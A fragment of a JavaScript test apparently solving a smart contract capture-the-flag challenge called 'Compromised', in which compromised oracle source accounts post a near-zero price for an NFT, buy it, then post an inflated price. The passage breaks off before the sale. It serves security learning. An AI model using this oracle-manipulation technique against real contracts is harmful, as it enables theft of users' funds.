...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    const buyPrice = ethers.utils.parseEther("0.01");
    const sellPrice = ethers.utils.parseEther("999.01");

    await oracle.connect(source1).postPrice("DVNFT", buyPrice);
    await oracle.connect(source2).postPrice("DVNFT", buyPrice);
    await exchange.connect(player).buyOne({ value: buyPrice });

    await oracle.connect(source1).postPrice("DVNFT", sellPrice);
    await oracle.connect(source2).postPrice("DVNFT", sellPrice);
